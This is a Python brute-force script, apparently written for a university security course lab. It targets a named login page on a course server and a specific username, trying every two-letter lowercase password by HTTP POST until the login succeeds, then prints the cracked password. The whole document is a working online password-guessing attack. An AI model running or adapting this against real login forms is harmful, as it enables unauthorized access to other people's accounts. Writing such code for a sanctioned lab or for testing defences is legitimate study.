#! /usr/bin/python3
import requests, time, re
from itertools import permutations

class SubmitForms():
    def __init__(self):
        self.url = 'https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php'                                                     # webiste to attack
        self.alphabet = [
            'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',       # alphabet: 26 characters
        ]
    
    def generatePasswords(self):
        print('Brute Force: Attack online froms')
        startTimer = time.perf_counter()                    # start timer
        passwords = list(permutations(self.alphabet, 2))    # generate list of passwords from alphabet, each password is length 2
        fields = {'un': 'jonathan22_-o6i', 'pw': None}      # user to hack

        for i in range(len(passwords)):                     # get each character to make a string password
            possiblePassword = ''
            for j in range(len(passwords[i])):
                possiblePassword += passwords[i][j]

            fields['pw'] = possiblePassword                
            request = None

            try:
                request = requests.post(self.url, data = fields)    # create http/https request with username and password fields
            except:
                print('Make sure you have your VPN on!')            # rquest is not able to reach wehsite
                exit(1)
            
            successful = re.split('<html>', request.text)           # website response
            successful = successful[0]

            if successful == '\r\nlogin was not successful':        # check if login was successful 
                print(f'{possiblePassword} was not successful')
            else:
                endTimer = time.perf_counter()
                totalTime = endTimer - startTimer
                username = fields['un']
                print(f'{username} was cracked! Password is {possiblePassword} Time: {totalTime}') # print found information
                break
            time.sleep(1)                   # sleep for 1 second
            



